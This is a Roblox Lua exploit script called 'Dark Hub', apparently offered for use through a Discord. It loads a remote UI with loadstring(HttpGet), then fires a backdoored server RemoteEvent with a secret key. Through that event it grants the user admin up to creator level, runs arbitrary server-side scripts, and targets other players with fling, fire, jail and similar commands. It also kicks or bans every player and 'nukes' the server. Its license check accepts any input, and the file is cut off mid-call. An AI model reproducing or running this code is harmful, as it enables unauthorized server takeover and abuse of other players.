--[[
██████╗  █████╗ ██████╗ ██╗  ██╗    ██╗  ██╗██╗   ██╗██████╗ 
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██║  ██║██║   ██║██╔══██╗
██║  ██║███████║██████╔╝█████╔╝     ███████║██║   ██║██████╔╝
██║  ██║██╔══██║██╔══██╗██╔═██╗     ██╔══██║██║   ██║██╔══██╗
██████╔╝██║  ██║██║  ██║██║  ██╗    ██║  ██║╚██████╔╝██████╔╝
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝  
Script Name: HubSource.lua
Author: Destin & Soup
Invite: discord.gg/KuWFCrSb3T
]]--

-- UI Loader
local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/DarkHub-Roblox/V2-Frontend/refs/heads/main/dist/main.lua"))()

-- Variables
local coreGui = game:GetService("CoreGui")
local httpService = game:GetService("HttpService")
local lighting = game:GetService("Lighting")
local players = game:GetService("Players")
local replicatedStorage = game:GetService("ReplicatedStorage")
local runService = game:GetService("RunService")
local guiService = game:GetService("GuiService")
local statsService = game:GetService("Stats")
local starterGui = game:GetService("StarterGui")
local teleportService = game:GetService("TeleportService")
local tweenService = game:GetService("TweenService")
local userInputService = game:GetService('UserInputService')
local gameSettings = UserSettings():GetService("UserGameSettings")

local localPlayer = players.LocalPlayer
local noclipEnabled = false
local flightEnabled = false
local discoEnabled = false
local invulnerabilityEnabled = false
local themeValues = {}
local hasLicense = true
local scriptActive = true

-- Vulnerability Settings
local lastVulnerability = "0f92267f-95c3-4775-b0c2-6fc46a4cdc5f"
local workingVulnerability = "0f92267f-95c3-4775-b0c2-6fc46a4cdc5f"
local currentVulnerability = workingVulnerability
local vulnerabilityKey = "DarkHub_Destinnotsus_OnTop"
local version = "V1"

-- GetInformationAsync & Whitelist
game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
    Event = "DarkHub_Running",
    Executor = identifyexecutor(),
    Version = version
})

-- Window Creation
local Window = WindUI:CreateWindow({
    Title = "Dark Hub",
    Icon = "rbxassetid://136678799354928",
    Author = "Premium Edition",
    Folder = "CloudHub",
    Size = UDim2.fromOffset(999,999),
    --Size = UDim2.fromOffset(580,460),
    Transparent = true,
    Theme = "Dark",
    SideBarWidth = 170,
})

-- Themes
Window:AddTheme({
    Name = "Midnight",
    
    Accent = "#121212",         -- Dark midnight background (1)
    Outline = "#3498db",        -- Cool blue outline        (2)
    
    Text = "#ecf0f1",           -- Light text               (3)
    Text2 = "#bdc3c7",          -- Softer gray text         (4)
    PlaceholderText = "#7f8c8d" -- Muted placeholder        (5)
})

Window:AddTheme({
    Name = "Rosewood",
    
    Accent = "#2c2c2c",         -- Deep brown background (1)
    Outline = "#e74c3c",        -- Rich rose outline      (2)
    
    Text = "#ffffff",           -- White text             (3)
    Text2 = "#f1c40f",          -- Warm yellow text       (4)
    PlaceholderText = "#dcdcdc" -- Light gray placeholder (5)
})

Window:AddTheme({
    Name = "Tropical Sunset",
    
    Accent = "#ffa07a",         -- Sunset pink background (1)
    Outline = "#ff4500",        -- Bright orange outline  (2)
    
    Text = "#2f4f4f",           -- Dark slate text        (3)
    Text2 = "#20b2aa",          -- Sea green text         (4)
    PlaceholderText = "#d3d3d3" -- Light gray placeholder (5)
})

Window:AddTheme({
    Name = "Cyber Neon",
    
    Accent = "#0f0f0f",         -- Dark base background (1)
    Outline = "#00ffcc",        -- Neon teal outline    (2)
    
    Text = "#ffffff",           -- White text           (3)
    Text2 = "#ff00ff",          -- Vibrant pink text    (4)
    PlaceholderText = "#5c5c5c" -- Dark placeholder     (5)
})

Window:AddTheme({
    Name = "Forest",
    
    Accent = "#1d2b1f",         -- Deep green background (1)
    Outline = "#4CAF50",        -- Forest green outline  (2)
    
    Text = "#ecf0f1",           -- Light text            (3)
    Text2 = "#90a955",          -- Olive text            (4)
    PlaceholderText = "#839192" -- Cool gray placeholder (5)
})

Window:AddTheme({
    Name = "Lavender Dream",
    
    Accent = "#e6e6fa",         -- Soft lavender background (1)
    Outline = "#9370db",        -- Rich purple outline      (2)
    
    Text = "#4b0082",           -- Indigo text              (3)
    Text2 = "#8a2be2",          -- Bright violet text       (4)
    PlaceholderText = "#bdb2ff" -- Pale purple placeholder  (5)
})

Window:AddTheme({
    Name = "Blue Ocean",
    
    Accent = "#1c3b5a",         -- Deep navy blue background (1)
    Outline = "#3498db",        -- Bright ocean blue outline (2)
    
    Text = "#d6eaf8",           -- Light sky blue text       (3)
    Text2 = "#aed6f1",          -- Soft blue text            (4)
    PlaceholderText = "#7fb3d5" -- Muted blue placeholder    (5)
})

-- Tabs
local homeTab = Window:Tab({
    Title = "Home",
    Icon = "home",
})

local characterTab = Window:Tab({
    Title = "Character",
    Icon = "person-standing",
})

local hardcoreScriptsTab = Window:Tab({
    Title = "Hardcore Scripts",
    Icon = "server-crash",
})

local adonisEssentialsTab = Window:Tab({
    Title = "Adonis Essentials",
    Icon = "shield",
})


local configurationTab = Window:Tab({
    Title = "Configuration",
    Icon = "settings",
})

-- Character Tab
characterTab:Section({ Title = "Player Properties" })

local playerSpeedSlider = characterTab:Slider({
    Title = "Player Speed",
    Step = 1,
    Value = {
        Min = 0,
        Max = 300,
        Default = 16,
    },
    Callback = function(value)
        if hasLicense == true then
            if scriptActive == true then
                game.Workspace[localPlayer.Name].Humanoid.WalkSpeed = value
            end
        end
    end
})

local jumpPowerSlider = characterTab:Slider({
    Title = "Jump Power",
    Step = 1,
    Value = {
        Min = 0,
        Max = 350,
        Default = 50,
    },
    Callback = function(value)
        if hasLicense == true then
            if scriptActive == true then
                game.Workspace[localPlayer.Name].Humanoid.JumpPower = value
            end
        end
    end
})

local flySpeedSlider = characterTab:Slider({
    Title = "Fly Speed",
    Step = 1,
    Value = {
        Min = 1,
        Max = 25,
        Default = 3,
    },
    Callback = function(value)
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommandAsPlayer",
                        Command = ":flyspeed me",
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = value
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end
})

local fieldOfViewSlider = characterTab:Slider({
    Title = "Field of View",
    Step = 1,
    Value = {
        Min = 45,
        Max = 120,
        Default = 70,
    },
    Callback = function(value)
        if hasLicense == true then
            if scriptActive == true then
                game.Workspace.Camera.FieldOfView = value
            end
        end
    end
})

characterTab:Section({ Title = "Player Actions" })

local noclipToggle = characterTab:Toggle({
    Title = "Noclip",
    Callback = function(state)
        if hasLicense == true then
            if noclipEnabled == false then
                if scriptActive == true then
                    noclipEnabled = true
                    if currentVulnerability == workingVulnerability then
                        game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                            Event = "RunCommandAsPlayer",
                            Command = ":noclip me",
                            Player = localPlayer,
                            Executor = identifyexecutor(),
                            Args = ""
                        })
                    else
                        WindUI:Notify({
                            Title = "Error",
                            Content = "Vulnerability has failed during execution.",
                            Duration = 5,
                        })
                    end
                end
            else
                if scriptActive == true then
                    noclipEnabled = false
                    if currentVulnerability == workingVulnerability then
                        game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                            Event = "RunCommandAsPlayer",
                            Command = ":clip me",
                            Player = localPlayer,
                            Executor = identifyexecutor(),
                            Args = ""
                        })
                    else
                        WindUI:Notify({
                            Title = "Error",
                            Content = "Vulnerability has failed during execution.",
                            Duration = 5,
                        })
                    end
                end
            end
        end
    end,
})

local flightToggle = characterTab:Toggle({
    Title = "Flight",
    Callback = function(state)
        if hasLicense == true then
            if flightEnabled == false then
                if scriptActive == true then
                    flightEnabled = true
                    if currentVulnerability == workingVulnerability then
                        game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                            Event = "RunCommandAsPlayer",
                            Command = ":fly me",
                            Player = localPlayer,
                            Executor = identifyexecutor(),
                            Args = ""
                        })
                    else
                        WindUI:Notify({
                            Title = "Error",
                            Content = "Vulnerability has failed during execution.",
                            Duration = 5,
                        })
                    end
                end
            else
                if scriptActive == true then
                    flightEnabled = false
                    if currentVulnerability == workingVulnerability then
                        game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                            Event = "RunCommandAsPlayer",
                            Command = ":unfly me",
                            Player = localPlayer,
                            Executor = identifyexecutor(),
                            Args = ""
                        })
                    else
                        WindUI:Notify({
                            Title = "Error",
                            Content = "Vulnerability has failed during execution.",
                            Duration = 5,
                        })
                    end
                end
            end
        end
    end,
})

local refreshButton = characterTab:Button({
    Title = "Refresh",
    Callback = function()
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommandAsPlayer",
                        Command = ":refresh me",
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = ""
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end,
})

local respawnButton = characterTab:Button({
    Title = "Respawn",
    Callback = function()
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommandAsPlayer",
                        Command = ":respawn me",
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = ""
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end,
})

local invulnerabilityToggle = characterTab:Toggle({
    Title = "Invulnerability",
    Callback = function(state)
        if hasLicense == true then
            if invulnerabilityEnabled == false then
                if scriptActive == true then
                    invulnerabilityEnabled = true
                    if currentVulnerability == workingVulnerability then
                        game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                            Event = "RunCommandAsPlayer",
                            Command = ":god me",
                            Player = localPlayer,
                            Executor = identifyexecutor(),
                            Args = ""
                        })
                    else
                        WindUI:Notify({
                            Title = "Error",
                            Content = "Vulnerability has failed during execution.",
                            Duration = 5,
                        })
                    end
                end
            else
                if scriptActive == true then
                    invulnerabilityEnabled = false
                    if currentVulnerability == workingVulnerability then
                        game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                            Event = "RunCommandAsPlayer",
                            Command = ":ungod me",
                            Player = localPlayer,
                            Executor = identifyexecutor(),
                            Args = ""
                        })
                    else
                        WindUI:Notify({
                            Title = "Error",
                            Content = "Vulnerability has failed during execution.",
                            Duration = 5,
                        })
                    end
                end
            end
        end
    end,
})

-- Hardcore Scripts Tab
--[[local nukeButton = hardcoreScriptsTab:Button({
    Title = "Nuke Script",
    Callback = function()
        
    end,
})--]]

local ownInput = hardcoreScriptsTab:Input({
    Title = "Script",
    Desc = "Execute your own script.",
    Value = "",
    PlaceholderText = "Executable Script",
    ClearTextOnFocus = true,
    Callback = function(Text)
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommand",
                        Command = ":s "..Text,
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = ""
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end
})

-- Adonis Tab
adonisEssentialsTab:Section({ Title = "Player Permissions" })

local creatorAdminButton = adonisEssentialsTab:Button({
    Title = "Give Creator Admin (Level 900)",
    Callback = function()
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "AddAdmin",
                        Level = 900,
                        Executor = identifyexecutor(),
                        Player = localPlayer,
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end,
})

local headAdminButton = adonisEssentialsTab:Button({
    Title = "Give Head Admin (Level 300)",
    Callback = function()
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "AddAdmin",
                        Level = 300,
                        Executor = identifyexecutor(),
                        Player = localPlayer,
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end,
})

local adminButton = adonisEssentialsTab:Button({
    Title = "Give Admin (Level 200)",
    Callback = function()
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "AddAdmin",
                        Level = 200,
                        Executor = identifyexecutor(),
                        Player = localPlayer,
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end,
})

local moderatorButton = adonisEssentialsTab:Button({
    Title = "Give Moderator (Level 100)",
    Callback = function()
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "AddAdmin",
                        Level = 100,
                        Executor = identifyexecutor(),
                        Player = localPlayer,
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end,
})

local removeAdminButton = adonisEssentialsTab:Button({
    Title = "Remove Admin",
    Callback = function()
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "AddAdmin",
                        Level = 0,
                        Executor = identifyexecutor(),
                        Player = localPlayer,
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end,
})

adonisEssentialsTab:Section({ Title = "Troll Commands" })

local dogInput = adonisEssentialsTab:Input({
    Title = "Dog",
    Desc = "Turn the target player(s) into a\ndog",
    Value = "",
    PlaceholderText = "Target Username",
    ClearTextOnFocus = true,
    Callback = function(Text)
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommandAsPlayer",
                        Command = ":dog",
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = Text
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end
})

local danceInput = adonisEssentialsTab:Input({
    Title = "Dance",
    Desc = "Make the target player(s) dance",
    Value = "",
    PlaceholderText = "Target Username",
    ClearTextOnFocus = true,
    Callback = function(Text)
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommandAsPlayer",
                        Command = ":dance",
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = Text
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end
})

local cutInput = adonisEssentialsTab:Input({
    Title = "Cut",
    Desc = "Make the target player(s) bleed",
    Value = "",
    PlaceholderText = "Target Username",
    ClearTextOnFocus = true,
    Callback = function(Text)
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommandAsPlayer",
                        Command = ":cut",
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = Text
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end
})

local chickenButton = adonisEssentialsTab:Button({
    Title = "Chicken",
    Desc = "Call on the KFC dark prophet powers of chicken",
    Callback = function()
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommandAsPlayer",
                        Command = ":chik3n",
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = ""
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end,
})

local deadlandsInput = adonisEssentialsTab:Input({
    Title = "Deadlands",
    Desc = "The edge of roblox math",
    Value = "",
    PlaceholderText = "Target Username",
    ClearTextOnFocus = true,
    Callback = function(Text)
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommandAsPlayer",
                        Command = ":deadlands",
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = Text
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end
})

local dizzyInput = adonisEssentialsTab:Input({
    Title = "Dizzy",
    Desc = "Causes motion sickness",
    Value = "",
    PlaceholderText = "Target Username",
    ClearTextOnFocus = true,
    Callback = function(Text)
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommandAsPlayer",
                        Command = ":dizzy",
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = Text
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end
})

local discoToggle = adonisEssentialsTab:Toggle({
    Title = "Disco",
    Desc = "Turn the place into a disco party",
    Callback = function(state)
        if discoEnabled == false then
            discoEnabled = true
            if hasLicense == true then
                if scriptActive == true then
                    if currentVulnerability == workingVulnerability then
                        game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                            Event = "RunCommandAsPlayer",
                            Command = ":disco",
                            Player = localPlayer,
                            Executor = identifyexecutor(),
                            Args = ""
                        })
                    else
                        WindUI:Notify({
                            Title = "Error",
                            Content = "Vulnerability has failed during execution.",
                            Duration = 5,
                        })
                    end
                end
            end
        elseif discoEnabled == true then
            discoEnabled = false
            if hasLicense == true then
                if scriptActive == true then
                    if currentVulnerability == workingVulnerability then
                        game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                            Event = "RunCommandAsPlayer",
                            Command = ":undisco",
                            Player = localPlayer,
                            Executor = identifyexecutor(),
                            Args = ""
                        })
                    else
                        WindUI:Notify({
                            Title = "Error",
                            Content = "Vulnerability has failed during execution.",
                            Duration = 5,
                        })
                    end
                end
            end
        end
    end,
})

local creeperInput = adonisEssentialsTab:Input({
    Title = "Creeper",
    Desc = "Turn the target player(s) into a creeper",
    Value = "",
    PlaceholderText = "Target Username",
    ClearTextOnFocus = true,
    Callback = function(Text)
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommandAsPlayer",
                        Command = ":creeper",
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = Text
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end
})

local fireInput = adonisEssentialsTab:Input({
    Title = "Fire",
    Desc = "Sets the target player(s) on fire",
    Value = "",
    PlaceholderText = "Target Username",
    ClearTextOnFocus = true,
    Callback = function(Text)
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommandAsPlayer",
                        Command = ":fire",
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = Text
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end
})

local flingInput = adonisEssentialsTab:Input({
    Title = "Fling",
    Desc = "Fling the target player(s)",
    Value = "",
    PlaceholderText = "Target Username",
    ClearTextOnFocus = true,
    Callback = function(Text)
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommandAsPlayer",
                        Command = ":fling",
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = Text
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end
})

local flattenInput = adonisEssentialsTab:Input({
    Title = "Flatten",
    Desc = "Flatten.",
    Value = "",
    PlaceholderText = "Target Username",
    ClearTextOnFocus = true,
    Callback = function(Text)
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommandAsPlayer",
                        Command = ":flatten",
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = Text
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end
})

local goldifyInput = adonisEssentialsTab:Input({
    Title = "Goldify",
    Desc = "Make the target player(s) look\nlike gold",
    Value = "",
    PlaceholderText = "Target Username",
    ClearTextOnFocus = true,
    Callback = function(Text)
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommandAsPlayer",
                        Command = ":goldify",
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = Text
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end
})

local blackHoleInput = adonisEssentialsTab:Input({
    Title = "Black Hole",
    Desc = "Sends the target player(s) down a hole",
    Value = "",
    PlaceholderText = "Target Username",
    ClearTextOnFocus = true,
    Callback = function(Text)
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommandAsPlayer",
                        Command = ":hole",
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = Text
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end
})

local iceInput = adonisEssentialsTab:Input({
    Title = "Ice",
    Desc = "Freezes the target player(s) in a block of ice",
    Value = "",
    PlaceholderText = "Target Username",
    ClearTextOnFocus = true,
    Callback = function(Text)
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommandAsPlayer",
                        Command = ":ice",
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = Text
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end
})

local infectInput = adonisEssentialsTab:Input({
    Title = "Infect",
    Desc = "Turn the target player(s) into a suit zombie",
    Value = "",
    PlaceholderText = "Target Username",
    ClearTextOnFocus = true,
    Callback = function(Text)
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommandAsPlayer",
                        Command = ":infect",
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = Text
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end
})

local jailInput = adonisEssentialsTab:Input({
    Title = "Jail",
    Desc = "Jail the target player(s)",
    Value = "",
    PlaceholderText = "Target Username",
    ClearTextOnFocus = true,
    Callback = function(Text)
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommandAsPlayer",
                        Command = ":jail",
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = Text
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end
})

local neonInput = adonisEssentialsTab:Input({
    Title = "Neon",
    Desc = "Make the target neon",
    Value = "",
    PlaceholderText = "Target Username",
    ClearTextOnFocus = true,
    Callback = function(Text)
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommandAsPlayer",
                        Command = ":jail",
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = Text
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end
})

local noobifyInput = adonisEssentialsTab:Input({
    Title = "Noobify",
    Desc = "Makes the target player(s) look like a noob",
    Value = "",
    PlaceholderText = "Target Username",
    ClearTextOnFocus = true,
    Callback = function(Text)
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommandAsPlayer",
                        Command = ":noobify",
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = Text
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end
})

adonisEssentialsTab:Section({ Title = "Abusive Commands" })

local nukeButton = adonisEssentialsTab:Button({
    Title = "Nuke",
    Desc = "Nuke the server",
    Callback = function()
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    for i,v in pairs(game.Players:GetPlayers()) do
                        game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                            Event = "AddAdmin",
                            Player = v, 
                            Executor = identifyexecutor(),
                            Level = 0
                        })
                    end
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommandAsPlayer",
                        Command = ":nuke me",
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = ""
                    })
                    for i,v in pairs(game.Workspace:GetChildren()) do
                        if v:IsA("Part") or v:IsA("Union") or v:IsA("MeshPart") then
                            v.Material = "CorrodedMetal"
                            Instance.new("Fire").Parent = v
                        end
                    end
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end,
})

local kickButton = adonisEssentialsTab:Button({
    Title = "Kick",
    Desc = "Disconnects everyone from the server",
    Callback = function()
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommandAsPlayer",
                        Command = ":kick all",
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = ""
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end,
})

local serverBanButton = adonisEssentialsTab:Button({
    Title = "Server Ban",
    Desc = "Bans everyone from the server",
    Callback = function()
        if hasLicense == true then
            if scriptActive == true then
                if currentVulnerability == workingVulnerability then
                    game.ReplicatedStorage[currentVulnerability]:FireServer(vulnerabilityKey, {
                        Event = "RunCommandAsPlayer",
                        Command = ":serverban all",
                        Player = localPlayer,
                        Executor = identifyexecutor(),
                        Args = ""
                    })
                else
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Vulnerability has failed during execution.",
                        Duration = 5,
                    })
                end
            end
        end
    end,
})

-- Configuration Tab
local vulnerabilityInput = configurationTab:Input({
    Title = "Vulnerability",                      -- Input Title
    Desc = "Please don't change this unless\ntold so by Dark Hub support.",                  -- Input Description
    Value = currentVulnerability,
    PlaceholderText = "", -- Placeholder Text
    ClearTextOnFocus = true,
    Callback = function(Text)
        if Text ~= workingVulnerability then
            currentVulnerability = Text 
            WindUI:Notify({
                Title = "Error",
                Content = "Vulnerability has failed during execution.",
                Duration = 5,
            })
        elseif Text == workingVulnerability then
            currentVulnerability = Text
        end
    end
})

local licenseKeyInput = configurationTab:Input({
    Title = "License Key",                      -- Input Title
    Desc = "Please enter your bought License Key here to redeem.",                  -- Input Description
    Value = "",                        -- Default Input Value
    PlaceholderText = "License Key", -- Placeholder Text
    ClearTextOnFocus = true,
    Callback = function(Text)
        hasLicense = true
        WindUI:Notify({
            Title = "Success",
            Content = "Successfully claimed 1 week license!",
            Duration = 5,
        })
        WindUI:Notify({
            Title = "Products Loaded",
            Content = "All products have been successfully loaded.",
            Duration = 5,
        })
    end
})

WindUI:Notify({
    Title = "Error",
    Content = "This account does not have any active products.",
